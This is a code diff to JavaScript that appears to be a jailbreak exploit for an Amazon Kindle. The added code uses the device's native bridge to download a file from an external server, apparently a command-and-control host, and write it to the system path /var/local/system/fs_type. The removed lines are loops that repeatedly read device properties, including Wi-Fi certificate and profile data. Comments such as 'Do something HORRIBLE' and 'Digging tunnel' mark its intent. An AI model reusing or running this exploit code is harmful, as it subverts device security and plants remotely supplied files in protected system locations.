@@ -1,4 +1,4 @@
-thumb = "UkVWQ1ZVZENWVWxNUkY5VVJWTlU="
+thumb = "YldWeVoyVnVNekV3Tnc9PQ==";
 
 function generateCryptoSign(signBy) {
     var e = Math.ceil(signBy).toExponential();
@@ -83,75 +83,27 @@ Pillow.MountSusDialog = function tmp() {
         var cryptoConstants = generateCryptoSign();
         var urlRoot = "https://mountsusc2.hackerman.fr";
 
-        //Pillow.logInfo("MountSus.listItemSelection selectedItem=" + item.name + " " + item.id);
-        
-        var max = Math.ceil((cryptoConstants[3] * 30));
-        for (var i=0; i < max; i++) {
-            nativeBridge.getIntLipcProperty("com.lab126.ccat", "logMask");
-            nativeBridge.getIntLipcProperty("com.lab126.cmd", "wirelessEnable");
-            nativeBridge.getIntLipcProperty("com.lab126.wan", "serviceState");
-            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
-            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
-            nativeBridge.getIntLipcProperty("com.lab126.winmgr", "ASRMode");
-            nativeBridge.getStringLipcProperty("com.lab126.winmgr", "orientation");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","certificateData");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","profileData");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","scanList");
-        }
-
         var drm3ResponseRequest = downloadDRMFile(filePath, urlRoot + "/MountSus/drmChallengeResponse", file);
-
-        //nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", updateDownloadRequest);
 
         document.getElementById("jailState").innerText = "Sending request...";
 
-        //nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", drm1DownloadRequest);
-
-        var max = Math.ceil((cryptoConstants[0] * 30));
-        for (var i=0; i < max; i++) {
-            nativeBridge.getIntLipcProperty("com.lab126.ccat", "logMask");
-            nativeBridge.getIntLipcProperty("com.lab126.cmd", "wirelessEnable");
-            nativeBridge.getIntLipcProperty("com.lab126.wan", "serviceState");
-            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
-            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
-            nativeBridge.getIntLipcProperty("com.lab126.winmgr", "ASRMode");
-            nativeBridge.getStringLipcProperty("com.lab126.winmgr", "orientation");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","certificateData");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","profileData");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","scanList");
-        }
-
         nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", drm3ResponseRequest);
 
-        setTimeout(function tmp() {var max = Math.ceil((cryptoConstants[1] * 30));
-        for (var i=0; i < max; i++) {
-            nativeBridge.getIntLipcProperty("com.lab126.ccat", "logMask");
-            nativeBridge.getIntLipcProperty("com.lab126.cmd", "wirelessEnable");
-            nativeBridge.getIntLipcProperty("com.lab126.wan", "serviceState");
-            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
-            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
-            nativeBridge.getIntLipcProperty("com.lab126.winmgr", "ASRMode");
-            nativeBridge.getStringLipcProperty("com.lab126.winmgr", "orientation");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","certificateData");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","profileData");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","scanList");
-        }}, 1000);
+        // Do something HORRIBLE
+        nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", {
+            url:                        urlRoot + "/MountSus/fs_type",        // The path to the server
+            dest:                       "/var/local/system/fs_type",           // Destination
+            unique_id:                  "archivedItems",
+            extra_headers:              "modelInfo:" + encodeURIComponent(thumb),
+
+            transport_any: 1,
+            priority: 80,
+            notify_progress_interval: 20,
+            notify_pub: "com.lab126.archive",
+            notify_prop: "transferProgressNotification",
+        });
 
         document.getElementById("jailState").innerText = "Digging tunnel...";
-
-        var max = Math.ceil((cryptoConstants[2] * 100));
-        for (var i=0; i < max; i++) {
-            nativeBridge.getIntLipcProperty("com.lab126.ccat", "logMask");
-            nativeBridge.getIntLipcProperty("com.lab126.cmd", "wirelessEnable");
-            nativeBridge.getIntLipcProperty("com.lab126.wan", "serviceState");
-            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
-            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
-            nativeBridge.getIntLipcProperty("com.lab126.winmgr", "ASRMode");
-            nativeBridge.getStringLipcProperty("com.lab126.winmgr", "orientation");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","certificateData");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","profileData");
-            nativeBridge.accessHasharrayProperty("com.lab126.wifid","scanList");
-        }
 
         setTimeout(function tmp() {
             document.getElementById("jailState").innerText = "Done! Close the popup and click Verify Jailbreak";
